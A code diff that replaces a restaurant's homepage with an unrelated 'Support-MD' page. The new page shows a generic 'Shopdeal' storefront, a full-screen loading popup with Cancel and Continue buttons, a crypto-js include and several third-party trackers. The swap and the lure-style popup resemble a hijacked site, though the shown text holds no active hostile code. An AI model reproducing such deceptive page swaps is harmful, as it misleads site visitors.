@@ -1,631 +1,719 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NoodleTable | Artisanal Hand-Crafted Dinner Noodles & Broth Atelier Manhattan</title>
-  <meta name="description" content="Experience nocturnal noodle gastronomy at NoodleTable. 18-hour bone broths, alkaline hand-pulled lamian, Sanuki udon, and seasonal dinner seatings at 181 Mercer Street.">
-  <link rel="canonical" href="https://noodletable.com/">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-MD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+  <style>
   
-  <!-- Google Analytics Tag G-0LY0HY7L01 -->
+    :root{
+      --ink:#0b1020;
+      --muted:#64748b;
+      --line:#e9ebf2;
+      --surface:#f8fafc;
+      --brand:#6d28d9;
+      --brand-dark:#5b21b6;
+      --accent:#db2777;
+      --radius:18px;
+      --shadow-sm:0 1px 2px rgba(16,24,40,.06), 0 1px 3px rgba(16,24,40,.08);
+      --shadow-md:0 12px 30px -14px rgba(16,24,40,.22);
+      --shadow-lg:0 28px 60px -24px rgba(16,24,40,.32);
+      --max:1180px;
+    }
+
+    *,*::before,*::after{ box-sizing:border-box; }
+    html{ scroll-behavior:smooth; }
+    body{
+      margin:0;
+      font-family:'Inter',system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+      color:var(--ink);
+      background:#fff;
+      line-height:1.6;
+      -webkit-font-smoothing:antialiased;
+    }
+    img{ max-width:100%; display:block; }
+    a{ color:inherit; text-decoration:none; }
+    button{ font:inherit; }
+    ul{ list-style:none; margin:0; padding:0; }
+
+    .container{ width:min(var(--max), 100% - 48px); margin-inline:auto; }
+
+    /* ============================================================
+       LOADING POPUP
+       ============================================================ */
+    .popup{
+      position:fixed; inset:0; z-index:9999;
+      display:flex; align-items:center; justify-content:center;
+      background:#fff; padding:24px;
+    }
+    .popup-content{
+      width:100%; max-width:560px;
+      text-align:center;
+      animation:popIn .5s cubic-bezier(.2,.8,.3,1) both;
+    }
+    @keyframes popIn{
+      from{ opacity:0; transform:translateY(14px) scale(.98); }
+      to{ opacity:1; transform:none; }
+    }
+    .loading-gif{
+      width:120px; height:120px;
+      margin:0 auto 26px;
+    }
+    .popup-title{
+      font-size:clamp(1.3rem,2.6vw,1.6rem);
+      font-weight:800; letter-spacing:-.025em;
+      margin:0 0 8px;
+    }
+    .popup-content p.sub{
+      margin:0 0 32px;
+      color:var(--muted);
+      font-size:.95rem;
+      font-weight:500;
+    }
+    .buttons{
+      display:flex; justify-content:center; gap:14px; flex-wrap:wrap;
+    }
+    .buttons button{
+      min-width:152px;
+      padding:14px 30px;
+      border:0; border-radius:13px;
+      cursor:pointer; font-weight:700; font-size:1rem;
+      transition:transform .18s ease, box-shadow .18s ease, background .18s ease;
+    }
+    #cancelBtn{ background:#f1f5f9; color:#334155; }
+    #cancelBtn:hover{ background:#e2e8f0; }
+    #continueBtn{
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff;
+      box-shadow:0 16px 30px -14px rgba(109,40,217,.85);
+    }
+    #continueBtn:hover{ transform:translateY(-2px); }
+
+    .hint{
+      background:linear-gradient(90deg,#1e1b4b,#4c1d95 45%,#831843);
+      color:#ede9fe;
+      text-align:center;
+      font-size:.82rem;
+      font-weight:600;
+      letter-spacing:.02em;
+      padding:11px 20px;
+      min-height:42px;
+      display:flex; align-items:center; justify-content:center;
+      gap:10px;
+    }
+
+    .nav{
+      position:sticky; top:0; z-index:80;
+      display:flex; align-items:center; gap:26px;
+      height:72px;
+      padding:0 max(24px, calc((100vw - var(--max)) / 2));
+      background:rgba(255,255,255,.86);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--line);
+    }
+    .brand{
+      display:flex; align-items:center; gap:11px;
+      font-weight:800; font-size:1.12rem;
+      letter-spacing:-.025em; white-space:nowrap;
+    }
+    .brand-mark{
+      width:36px; height:36px; flex:none;
+      display:grid; place-items:center;
+      border-radius:11px; font-size:1rem;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      box-shadow:0 10px 22px -10px rgba(109,40,217,.9);
+    }
+
+    .links{ display:flex; gap:6px; }
+    .links a{
+      font-size:.9rem; font-weight:500; color:#4b5563;
+      padding:8px 14px; border-radius:10px;
+      transition:color .18s ease, background .18s ease;
+    }
+    .links a:hover{ color:var(--brand); background:#f5f3ff; }
+
+    .clock{
+      margin-left:auto;
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:.78rem; font-weight:600; color:var(--brand-dark);
+      background:#f5f3ff; border:1px solid #ede9fe;
+      padding:7px 13px; border-radius:999px; white-space:nowrap;
+    }
+    .cart-btn{
+      display:inline-flex; align-items:center; gap:8px;
+      border:0; cursor:pointer;
+      background:var(--ink); color:#fff;
+      font-weight:600; font-size:.88rem;
+      padding:10px 18px; border-radius:999px;
+      transition:transform .18s ease, background .18s ease;
+    }
+    .cart-btn:hover{ background:var(--brand); transform:translateY(-1px); }
+    .cart-btn .badge{
+      background:#fff; color:var(--ink);
+      border-radius:999px; min-width:20px; height:20px;
+      display:grid; place-items:center;
+      padding:0 6px; font-size:.72rem; font-weight:800;
+    }
+
+    @media (max-width:900px){
+      .links{ display:none; }
+      .clock{ display:none; }
+    }
+    @media (max-width:560px){
+      .nav{ gap:14px; height:66px; padding-inline:18px; }
+      .cart-btn{ padding:9px 14px; font-size:.82rem; }
+    }
+
+    /* ============================================================
+       HERO
+       ============================================================ */
+    .hero{
+      display:grid;
+      grid-template-columns:1.03fr .97fr;
+      gap:60px; align-items:center;
+      padding:76px max(24px, calc((100vw - var(--max)) / 2)) 68px;
+      background:
+        radial-gradient(900px 420px at 8% -20%, rgba(109,40,217,.14), transparent 62%),
+        radial-gradient(760px 420px at 98% -6%, rgba(219,39,119,.12), transparent 58%),
+        linear-gradient(180deg,#fbfaff,#fff);
+    }
+    @media (max-width:960px){
+      .hero{ grid-template-columns:1fr; gap:44px; padding-top:52px; padding-bottom:52px; }
+    }
+
+    .eyebrow{
+      display:inline-flex; align-items:center; gap:8px;
+      background:#fff; border:1px solid #ede9fe;
+      color:var(--brand-dark);
+      font-size:.78rem; font-weight:700;
+      letter-spacing:.06em; text-transform:uppercase;
+      padding:7px 15px; border-radius:999px;
+      box-shadow:var(--shadow-sm);
+      margin-bottom:20px;
+    }
+    .eyebrow .dot{
+      width:7px; height:7px; border-radius:50%;
+      background:var(--accent);
+      box-shadow:0 0 0 4px rgba(219,39,119,.16);
+    }
+
+    .hero-text h1{
+      font-size:clamp(2.2rem,5vw,3.4rem);
+      line-height:1.08; letter-spacing:-.035em;
+      font-weight:900; margin:0 0 18px;
+    }
+    .hero-text h1 span{
+      background:linear-gradient(115deg,var(--brand),var(--accent));
+      -webkit-background-clip:text; background-clip:text; color:transparent;
+    }
+    .hero-text p{
+      font-size:1.05rem; color:var(--muted);
+      max-width:490px; margin:0 0 30px;
+    }
+
+    .cta{
+      display:inline-flex; align-items:center; gap:9px;
+      padding:15px 30px; border-radius:999px;
+      background:linear-gradient(135deg,var(--brand),var(--accent));
+      color:#fff; font-weight:700; font-size:.95rem;
+      box-shadow:0 16px 32px -16px rgba(109,40,217,.9);
+      transition:transform .18s ease, box-shadow .18s ease;
+    }
+    .cta:hover{ transform:translateY(-2px); box-shadow:0 22px 40px -18px rgba(109,40,217,.95); }
+
+    .hero-stats{
+      display:flex; gap:34px; flex-wrap:wrap;
+      margin-top:40px; padding-top:26px;
+      border-top:1px solid var(--line);
+    }
+    .hero-stats strong{
+      display:block; font-size:1.35rem; font-weight:800; letter-spacing:-.02em;
+    }
+    .hero-stats span{ font-size:.82rem; color:var(--muted); }
+
+    .hero-img{
+      width:100%; aspect-ratio:5/4; object-fit:cover;
+      border-radius:26px;
+      box-shadow:var(--shadow-lg);
+    }
+
+    /* ============================================================
+       TRUST STRIP
+       ============================================================ */
+    .trust{
+      border-block:1px solid var(--line);
+      background:var(--surface);
+    }
+    .trust-grid{
+      display:grid; grid-template-columns:repeat(4,1fr);
+      gap:10px; padding:22px 0;
+    }
+    .trust-item{
+      display:flex; align-items:center; justify-content:center; gap:9px;
+      font-size:.85rem; font-weight:600; color:#475569;
+      padding:6px 10px; border-right:1px solid var(--line);
+    }
+    .trust-item:last-child{ border-right:0; }
+    .trust-item span{ font-size:1.05rem; }
+    @media (max-width:860px){
+      .trust-grid{ grid-template-columns:repeat(2,1fr); gap:14px; }
+      .trust-item{ border-right:0; justify-content:flex-start; }
+    }
+
+    /* ============================================================
+       SECTIONS
+       ============================================================ */
+    .section{ padding:76px 0; }
+    .section-head{ text-align:center; max-width:640px; margin:0 auto 42px; }
+    .section-head .kicker{
+      display:inline-block;
+      font-size:.76rem; font-weight:800;
+      letter-spacing:.12em; text-transform:uppercase;
+      color:var(--brand); margin-bottom:10px;
+    }
+    .section-head h2{
+      font-size:clamp(1.6rem,3.2vw,2.2rem);
+      font-weight:900; letter-spacing:-.03em;
+      margin:0 0 10px; line-height:1.15;
+    }
+    .section-head p{ margin:0; color:var(--muted); font-size:.97rem; }
+
+
+    .grid{
+      display:grid; gap:24px;
+      grid-template-columns:repeat(auto-fill,minmax(250px,1fr));
+    }
+    .card{
+      display:flex; flex-direction:column;
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius); overflow:hidden;
+      transition:transform .22s ease, box-shadow .22s ease, border-color .22s ease;
+    }
+    .card:hover{
+      transform:translateY(-6px);
+      box-shadow:var(--shadow-lg);
+      border-color:transparent;
+    }
+    .card-media{
+      position:relative; aspect-ratio:4/3;
+      overflow:hidden; background:#f1f5f9;
+    }
+    .card-media img{
+      width:100%; height:100%; object-fit:cover;
+      transition:transform .55s cubic-bezier(.2,.7,.3,1);
+    }
+    .card:hover .card-media img{ transform:scale(1.07); }
+
+    .card .badge{
+      position:absolute; top:12px; left:12px;
+      font-size:.68rem; font-weight:800; letter-spacing:.06em;
+      text-transform:uppercase; color:#fff;
+      padding:6px 11px; border-radius:999px;
+      background:var(--ink);
+    }
+    .card .badge--sale{ background:var(--accent); }
+    .card .badge--new{ background:#0ea5e9; }
+
+    .card .body{
+      padding:16px 18px 18px;
+      display:flex; flex-direction:column; flex:1;
+    }
+    .card .cat{
+      font-size:.7rem; font-weight:700; letter-spacing:.1em;
+      text-transform:uppercase; color:#94a3b8; margin-bottom:6px;
+    }
+    .card h3{
+      margin:0 0 8px; font-size:1rem; font-weight:700; letter-spacing:-.015em;
+    }
+    .price-row{
+      display:flex; align-items:baseline; gap:8px;
+      margin-top:auto; padding-top:6px;
+    }
+    .card .price{
+      font-size:1.12rem; font-weight:800;
+      letter-spacing:-.02em; color:var(--ink);
+    }
+    .card .old{
+      font-size:.85rem; color:#a3aab8;
+      text-decoration:line-through; font-weight:500;
+      margin:0;
+    }
+    .save{
+      margin-left:auto;
+      font-size:.7rem; font-weight:800;
+      color:#047857; background:#ecfdf5;
+      padding:3px 8px; border-radius:999px;
+    }
+
+    .add{
+      margin-top:14px; width:100%;
+      display:inline-flex; align-items:center; justify-content:center; gap:8px;
+      border:1px solid var(--ink); background:#fff; color:var(--ink);
+      font-weight:700; font-size:.88rem;
+      padding:11px; border-radius:11px; cursor:pointer;
+      transition:background .2s ease, color .2s ease, transform .18s ease;
+    }
+    .add:hover{ background:var(--ink); color:#fff; transform:translateY(-1px); }
+    .add:active{ transform:translateY(0); }
+
+  
+    .about{
+      background:var(--surface);
+      border-block:1px solid var(--line);
+    }
+    .features{
+      display:grid; gap:22px;
+      grid-template-columns:repeat(auto-fit,minmax(210px,1fr));
+    }
+    .feature{
+      background:#fff; border:1px solid var(--line);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      text-align:left;
+      transition:transform .22s ease, box-shadow .22s ease;
+    }
+    .feature:hover{ transform:translateY(-4px); box-shadow:var(--shadow-md); }
+    .feature span{
+      display:grid; place-items:center;
+      width:48px; height:48px;
+      border-radius:14px; font-size:1.3rem;
+      background:linear-gradient(135deg,#f5f3ff,#fdf2f8);
+      border:1px solid #ede9fe;
+      margin-bottom:16px;
+    }
+    .feature h3{ margin:0 0 6px; font-size:1rem; font-weight:800; letter-spacing:-.015em; }
+    .feature p{ margin:0; color:var(--muted); font-size:.87rem; line-height:1.55; }
+
+    /* ============================================================
+       FOOTER
+       ============================================================ */
+    .footer{
+      background:#0b1020;
+      color:#94a3b8;
+      text-align:center;
+      padding:44px 24px;
+      font-size:.85rem;
+    }
+    .footer .fbrand{
+      display:inline-flex; align-items:center; gap:10px;
+      color:#fff; font-weight:800; font-size:1rem;
+      letter-spacing:-.02em; margin-bottom:10px;
+    }
+    .footer p{ margin:0 0 6px; }
+    .footer small{ color:#64748b; font-size:.78rem; }
+
+  
+    @media (prefers-reduced-motion:reduce){
+      *{ animation-duration:.001ms !important; transition-duration:.001ms !important; }
+      html{ scroll-behavior:auto; }
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
   <script>
     window.dataLayer = window.dataLayer || [];
     function gtag(){dataLayer.push(arguments);}
     gtag('js', new Date());
+
     gtag('config', 'G-0LY0HY7L01');
   </script>
 
-  <!-- Google Fonts via link tag strictly -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-  
-  <link rel="stylesheet" href="assets/css/style.css">
-  <script src="assets/js/main.js" defer></script>
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
-  <header class="site-header">
-    <div class="container header-inner">
-      <a href="index.php" class="brand-logo" aria-label="NoodleTable Home">
-        <span class="brand-name">NoodleTable</span>
-        <span class="brand-sub">Manhattan Dinner Atelier</span>
-      </a>
-      <nav class="desktop-nav" aria-label="Main Navigation">
-        <a href="index.php" class="nav-link active">Dinner Service</a>
-        <a href="about.html" class="nav-link ">The Atelier</a>
-        <a href="blog.html" class="nav-link ">Culinary Science</a>
-        <a href="contact.html" class="nav-link ">Reservations</a>
-      </nav>
-      <div class="header-actions">
-        <a href="tel:+18887775845" class="header-phone-link">
-          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
-          <span>+1-888-777-5845</span>
-        </a>
-        <a href="contact.html" class="btn btn-primary">Reserve Table</a>
-        <button class="mobile-toggle" id="mobile-toggle" aria-label="Open Navigation Drawer">
-          <span class="hamburger-line"></span>
-          <span class="hamburger-line"></span>
-          <span class="hamburger-line"></span>
-        </button>
-      </div>
-    </div>
-  </header>
 
-  <div class="mobile-drawer-backdrop" id="mobile-drawer-backdrop"></div>
-  <div class="mobile-drawer" id="mobile-drawer" aria-label="Mobile Navigation">
-    <div class="mobile-drawer-header">
-      <div class="brand-logo">
-        <span class="brand-name">NoodleTable</span>
-        <span class="brand-sub">Dinner Atelier</span>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <h2 class="popup-title">Loading... Please wait.</h2>
+      <p class="sub">We're preparing your store experience.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
       </div>
-      <button id="drawer-close" aria-label="Close Navigation Drawer" style="background:none;border:none;font-size:24px;cursor:pointer;">&times;</button>
-    </div>
-    <div class="mobile-nav-links">
-      <a href="index.php">Dinner Service</a>
-      <a href="about.html">The Atelier &amp; Craft</a>
-      <a href="blog.html">Culinary Science &amp; Treatises</a>
-      <a href="contact.html">Table Reservations</a>
-      <a href="privacy-policy.html">Privacy Policy</a>
-      <a href="terms-and-conditions.html">Terms &amp; Conditions</a>
-    </div>
-    <div class="drawer-contact-info">
-      <p><strong>NoodleTable Atelier</strong></p>
-      <p>181 Mercer Street, New York, NY 10012, United States</p>
-      <p style="margin-top:8px;"><strong>Concierge:</strong> +1-888-777-5845</p>
-      <p style="font-size:11px; margin-top:8px;">Dinner Seatings: Wed–Sun, 5:30 PM &amp; 8:15 PM</p>
     </div>
   </div>
-  <main>
-    <!-- Section 1: Hero Section -->
-    <section class="hero-section">
-      <div class="container">
-        <div class="hero-grid">
-          <div class="hero-content">
-            <span class="hero-tag">
-              <span>🍜</span> SoHo Manhattan Culinary Atelier
-            </span>
-            <h1 class="hero-title">The Art of the Evening Noodle Dinner Service</h1>
-            <p class="hero-lead">NoodleTable reimagines the nocturnal noodle ritual at 181 Mercer Street. Merging alkaline wheat dough physics, hand-pulled tensile elasticity, and 18-hour double-extracted broths into an unforgettable multi-course dinner service.</p>
-            <div class="hero-actions">
-              <a href="contact.html" class="btn btn-primary">Reserve Dinner Table</a>
-              <a href="#calculator" class="btn btn-secondary">Hydration Calculator</a>
-            </div>
-            <div class="hero-stats">
-              <div class="stat-item">
-                <h4>18 Hrs</h4>
-                <p>Simmered Double Broth</p>
-              </div>
-              <div class="stat-item">
-                <h4>34% - 56%</h4>
-                <p>Micro-Hydration Curves</p>
-              </div>
-              <div class="stat-item">
-                <h4>2 Seatings</h4>
-                <p>Nightly Intimate Service</p>
-              </div>
-            </div>
-          </div>
-          <div class="hero-media">
-            <div class="hero-image-wrap">
-              <img src="assets/images/hero_handcrafted_dinner_noodles.jpg" alt="Handcrafted dinner noodles in stoneware ceramic bowl with savory broth" width="600" height="480">
-            </div>
-            <div class="hero-badge-card">
-              <h5>Artisanal Wheat Physics</h5>
-              <p>Handcrafted daily at 181 Mercer St with stone-milled heirloom grains and alkaline spring water.</p>
-            </div>
-          </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ Shopdeal — Summer Sale is live · Up to 50% off</div>
+
+    <header class="nav">
+      <div class="brand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
+
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <span class="eyebrow"><span class="dot"></span> Summer Sale · Up to 50% Off</span>
+        <h1>Everyday essentials, <span>beautifully priced.</span></h1>
+        <p>Trendy products, free stock photos, all on a single page. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now →</a>
+
+        <div class="hero-stats">
+          <div><strong>12,480+</strong><span>Happy customers</span></div>
+          <div><strong>4.9 / 5</strong><span>Average rating</span></div>
+          <div><strong>48 hrs</strong><span>US delivery</span></div>
         </div>
       </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/900/720" alt="hero" />
     </section>
 
-    <!-- Section 2: Signature Dinner Noodle Flights -->
-    <section class="section" id="tasting-menu">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Evening Degustation</span>
-          <h2 class="section-title">The Dinner Noodle Collection</h2>
-          <p class="section-subtitle">Every bowl is paired with a distinct extraction profile, dough tensile geometry, and botanical garnish tailored specifically for an evening dining pace.</p>
-        </div>
-        <div class="cards-grid-3">
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/simmering_bone_broth_noodle_bowl.jpg" alt="Kansui Alkaline Ramen with 18-Hour Double Chintan">
-              <span class="card-badge">Signature Course</span>
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Tokyo Kansui Technique</span>
-              <h3 class="card-title">Midnight Chintan Double Broth</h3>
-              <p class="card-desc">34% hydration thin-cut alkaline noodles served in an intensely clarified 18-hour marrow and smoked kombu stock, topped with slow-roasted pork jowl and charred scallion oil.</p>
-              <div class="card-footer">
-                <span class="card-price">$34 Dinner Course</span>
-                <a href="contact.html" class="btn btn-light" style="padding:8px 16px; font-size:13px;">Reserve</a>
-              </div>
-            </div>
-          </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/braised_beef_shank_noodle_entree.jpg" alt="Braised Beef Shank Knife Cut Ribbon Noodles">
-              <span class="card-badge">Chef Selection</span>
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Lanzhou Heritage Craft</span>
-              <h3 class="card-title">Braised Shank Ribbon Lamian</h3>
-              <p class="card-desc">Wide, hand-pulled ribbon strands stretched moments before service, paired with 12-hour braised pasture-raised beef shank, spiced black vinegar, and fresh garden cilantro.</p>
-              <div class="card-footer">
-                <span class="card-price">$38 Dinner Course</span>
-                <a href="contact.html" class="btn btn-light" style="padding:8px 16px; font-size:13px;">Reserve</a>
-              </div>
-            </div>
-          </div>
-
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/claypot_braised_noodle_hotpot.jpg" alt="Sanuki Udon in Golden Bonito Dashi Claypot">
-              <span class="card-badge">Winter Special</span>
-            </div>
-            <div class="card-body">
-              <span class="card-origin">Kagawa Sanuki Tradition</span>
-              <h3 class="card-title">Golden Shiro Dashi Udon</h3>
-              <p class="card-desc">Ashi-fumi compressed thick wheat udon with distinct chewy rebound, immersed in shimmering golden dashi infused with white soy, charred maitake, and shaved bottarga.</p>
-              <div class="card-footer">
-                <span class="card-price">$36 Dinner Course</span>
-                <a href="contact.html" class="btn btn-light" style="padding:8px 16px; font-size:13px;">Reserve</a>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 3: Interactive Noodle Dough Hydration & Broth Calculator -->
-    <section class="section section-alt" id="calculator">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">Interactive Kitchen Science</span>
-          <h2 class="section-title">Noodle Dough Hydration &amp; Broth Pairing Engine</h2>
-          <p class="section-subtitle">Explore how wheat flour protein percentages, mineral hydration ratios, and boiling bath temperatures dictate chew resistance and broth synergy.</p>
-        </div>
-        <div class="calc-box">
-          <div class="calc-controls">
-            <div class="calc-form-group">
-              <label class="calc-label" for="noodle-type">Noodle Architecture &amp; Tradition</label>
-              <select class="calc-select" id="noodle-type">
-                <option value="kansui-ramen">Kansui Alkaline Noodle (34% Hydration - High Tensile)</option>
-                <option value="hand-pulled-lamian">Hand-Pulled Lamian (48% Hydration - Silky Drag)</option>
-                <option value="sanuki-udon">Sanuki Ashi-Fumi Udon (50% Hydration - Mochi Elastic)</option>
-                <option value="knife-cut-ribbon">Knife-Cut Shanxi Ribbon (44% Hydration - Toothsome)</option>
-                <option value="egg-tagliolini">Emilian Egg Tagliolini (56% Hydration - Custard Ribbon)</option>
-              </select>
-            </div>
-            <div class="calc-form-group">
-              <label class="calc-label" for="flour-weight">Batch Flour Quantity (Grams): <span class="calc-range-val" id="flour-val">500g</span></label>
-              <input type="range" class="calc-range" id="flour-weight" min="200" max="2000" step="50" value="500">
-            </div>
-            <p style="font-size:13px; color:var(--color-text-muted); line-height:1.6;">At our Mercer Street atelier, our culinary team precisely monitors water mineral harness (TDS 45 ppm) and ambient humidity to adjust milligram water additions during batch kneading.</p>
-          </div>
-          <div class="calc-result-panel">
-            <div class="result-metric">
-              <div class="result-label">Target Mineral Water Addition</div>
-              <div class="result-value" id="calc-water">170 ml (170g)</div>
-              <div class="result-note" id="calc-hydration">34% Hydration Ratio</div>
-            </div>
-            <div class="result-metric">
-              <div class="result-label">Ideal Evening Broth Extraction</div>
-              <div class="result-value" style="font-size:18px;" id="calc-broth">18-Hour Double Chintan with Kombu &amp; Roasted Marrow</div>
-            </div>
-            <div class="result-metric">
-              <div class="result-label">Cook Time &amp; Tensile Chew Profile</div>
-              <div class="result-value" style="font-size:18px;" id="calc-simmer">90 to 110 seconds at rolling 100°C</div>
-              <div class="result-note" id="calc-chew">Firm Al Dente Elastic Tensile Snap (Kansui Alkaline)</div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 4: Dough Physics & Heirloom Milling -->
-    <section class="section">
-      <div class="container">
-        <div class="feature-split">
-          <div class="feature-media">
-            <img src="assets/images/chef_hand_pulling_noodle_pass.jpg" alt="Chef stretching and pulling fresh noodle dough in open kitchen" width="560" height="420">
-          </div>
-          <div class="feature-content">
-            <span class="section-tag">Atelier Craftsmanship</span>
-            <h3>Manual Shear Strain &amp; Gluten Molecular Alignment</h3>
-            <p>Unlike commercial extrusion methods that compress dough under extreme industrial friction, our noodle artisans stretch, fold, and twist wheat dough by hand. This continuous manual tensioning aligns glutenin and gliadin peptide chains along uniform parallel axes.</p>
-            <ul class="feature-list">
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Unbleached High-Protein Wheat:</strong> Milled from hard red spring wheat yielding 13.5% protein for optimal strand structural integrity.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Kansui Mineral Precision:</strong> Sodium carbonate and potassium carbonate solution adjusted to pH 9.2 to inhibit starch gelatinization in boiling water.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Zero Pre-Boil Oxidation:</strong> Dough is freshly kneaded and rested in humidity-regulated proofing chambers prior to each evening dinner seating.</span>
-              </li>
-            </ul>
-            <a href="about.html" class="btn btn-secondary">Discover The Atelier History</a>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 5: The 18-Hour Broth Extraction Laboratory -->
-    <section class="section section-alt" id="broth-lab">
-      <div class="container">
-        <div class="feature-split reverse">
-          <div class="feature-media">
-            <img src="assets/images/heritage_18hour_dashi_stockpot.jpg" alt="Heritage stockpot simmering rich chicken and marrow broth" width="560" height="420">
-          </div>
-          <div class="feature-content">
-            <span class="section-tag">Thermal Physics</span>
-            <h3>18-Hour Double Extraction &amp; Glutamate Chemistry</h3>
-            <p>The soul of our dinner service resides in our simmered stockpots. We combine cold-soaked Hokkaido ma-kombu kelp with aged katsuobushi flakes at precisely 65°C to maximize free glutamate release before introducing roasted marrow bones and pasture-raised heritage poultry.</p>
-            <ul class="feature-list">
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Sub-Boil Convection:</strong> Simmered between 88°C and 92°C to prevent lipid emulsification, producing crystalline broth clarity.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Synergistic Umami Bonding:</strong> Naturally pairing inosinate from bonito with glutamate from kombu for an eightfold expansion in savoriness.</span>
-              </li>
-              <li>
-                <span class="feature-icon">✦</span>
-                <span><strong>Triple Filtration:</strong> Passed sequentially through fine Japanese copper sieves and unbleached cotton cloths for velvet mouthfeel.</span>
-              </li>
-            </ul>
-            <a href="blog/dashi-extraction-physics-kombu-bonito-umami.html" class="btn btn-primary">Read Dashi Extraction Science</a>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- Section 6: Evening Dinner Salon & Intimate Atmosphere -->
-    <section class="section">
-      <div class="container">
-        <div class="section-header">
-          <span class="section-tag">The Evening Experience</span>
-          <h2 class="section-title">The Mercer Street Dining Chamber</h2>
-          <p class="section-subtitle">Step from the historic cobblestones of SoHo into a quiet sanctuary of warm cedarwood, cast-iron architectural textures, and candlelit evening intimacy.</p>
-        </div>
-        <div class="cards-grid-3">
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/candlelit_mercer_noodle_table.jpg" alt="Candlelit dinner table at 181 Mercer Street">
-            </div>
-            <div class="card-body">
-              <h3 class="card-title">The Cedar Counter</h3>
-              <p class="card-desc">Ten counter seats overlooking the active noodle pulling hearth, where dinner guests observe every flick of the chef's wrists and ladle of steaming broth.</p>
-            </div>
-          </div>
-          <div class="noodle-card">
-            <div class="card-thumb">
-              <img src="assets/images/manhattan_noodle_table_dining_salon.jpg" alt="Dining room salon with warm architectural lighting">
-            </div>
-            <div class="card-body">
-              <h3 class="card-title">The Hearth Salon</h3>
-              <p class="card-desc">Spacious handcrafted oak banquettes designed for intimate evening conversation, tasting flights, and multi-course culinary tastings.</p>
-            </div>
-          </div>
